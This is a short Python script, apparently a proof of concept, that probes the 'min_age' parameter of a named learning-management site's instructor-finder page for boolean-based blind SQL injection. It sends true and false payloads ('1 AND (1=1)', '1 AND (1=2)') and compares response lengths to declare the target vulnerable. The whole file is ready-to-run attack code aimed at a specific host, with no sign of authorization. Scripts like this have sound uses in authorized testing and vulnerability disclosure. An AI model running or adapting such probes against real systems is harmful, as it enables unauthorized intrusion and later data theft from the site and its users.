import requests

TARGET = "https://lms.rocket-soft.org/instructor-finder"
PARAM = "min_age"

def prove_sqli():
    print("=== SQL Injection Proof of Concept (PoC) ===")
    print(f"Target URL: {TARGET}")
    print(f"Parameter: {PARAM}\n")

    # 1. Test TRUE condition
    payload_true = "1 AND (1=1)"
    resp_true = requests.get(TARGET, params={PARAM: payload_true}, timeout=15)
    len_true = len(resp_true.text)
    print(f"[*] Payload TRUE:  {payload_true}")
    print(f"    Response Length: {len_true} bytes (Results are visible)")

    # 2. Test FALSE condition
    payload_false = "1 AND (1=2)"
    resp_false = requests.get(TARGET, params={PARAM: payload_false}, timeout=15)
    len_false = len(resp_false.text)
    print(f"[*] Payload FALSE: {payload_false}")
    print(f"    Response Length: {len_false} bytes (No results returned)")

    # 3. Conclusion
    diff = abs(len_true - len_false)
    print(f"\n[!] RESULT:")
    if diff > 1000: # Significant difference
        print(f"    CONFIRMED: The target IS VULNERABLE to Boolean-based Blind SQL Injection.")
        print(f"    Difference in response: {diff} bytes.")
    else:
        print("    UNCONFIRMED: No significant difference found.")

if __name__ == "__main__":
    prove_sqli()
